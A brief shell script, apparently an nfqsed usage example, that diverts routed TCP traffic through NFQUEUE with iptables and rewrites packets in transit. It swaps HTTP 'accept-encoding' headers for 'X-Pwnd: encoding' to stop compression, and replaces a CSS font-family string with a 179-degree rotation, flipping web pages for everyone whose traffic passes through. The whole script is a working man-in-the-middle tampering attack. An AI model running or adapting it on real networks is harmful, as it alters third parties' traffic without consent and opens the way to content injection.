#!/bin/sh

# use INPUT to see effects locally
# use FORWARD to affect only packets routed for others
iptables_rule="FORWARD -p tcp -j NFQUEUE --queue-num 0"

iptables_cleanup="iptables -D $iptables_rule"
trap "$iptables_cleanup" EXIT || exit 1

set -x

while $iptables_cleanup 2>/dev/null; do :; done

iptables -A $iptables_rule || exit 1

./nfqsed -vv \
 -s '/accept-encoding:/X-Pwnd: encoding' \
 -s '/font-family:?????????????/transform:rotate(179deg);'
